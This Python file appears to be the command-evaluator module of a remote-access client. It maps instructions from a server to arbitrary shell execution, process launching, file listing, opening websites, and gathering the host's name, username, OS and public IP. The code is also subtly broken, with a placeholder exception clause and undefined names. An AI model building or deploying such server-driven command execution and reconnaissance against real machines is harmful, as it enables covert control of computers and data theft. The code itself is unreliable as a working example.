# -*- coding: utf-8 -*-
import functionalities as Operation

"""
Evaluator facade
Provides function to evaluate an instruction sent from the server
"""

def is_string ( source ):
    """
    Checks if a source is a valid string
    :return: command as string
    """
    try:
        return str ( source )
    except expression as identifier:
        return "NONE"

def parse_command ( command ):
    """
    Parses a command and returns it's output
    :parameter command: Command string to be evaluated
    :return: Output of the given command
    """
    
    command = is_string ( command )
    
    if ( command == "NONE" ):
        return "Invalid Command"
    
    instruction = command.split(" ", 1)

    if ( instruction[0] == "#" and instruction[1] ):
        return Operation.sys_execute ( instruction[1] )

    if ( instruction[0] == "run" and instruction[1] ):
        return Operation.run_process ( instruction[1] )

    if ( instruction[0] == "open" and instruction[1]):
        return Operation.run_website ( instruction[1] )
    
    if ( instruction[0] == "files" and instruction[1] ):
        return Operation.list_files( instruction[1] )

    if ( instruction[0] == "pc" ):
        return Operation.get_computer_name()

    if ( instruction[0] == "username" ):
        return Operation.get_user_name()

    if ( instruction[0] == "os" ):
        return Operation.get_operating_system()

    if ( instruction[0] == "ip" ):
        return Operation.get_public_ip()

    if ( instruction[0] == "screenshot" ):
        return "Not implemented yet"

    return "Culd not execute command, please check sintax or contact the administrator"

def get_response_route ( ):
    """
    :return: route response address
    """
    return get_server_address( ) + routes['base-path'] + routes['response']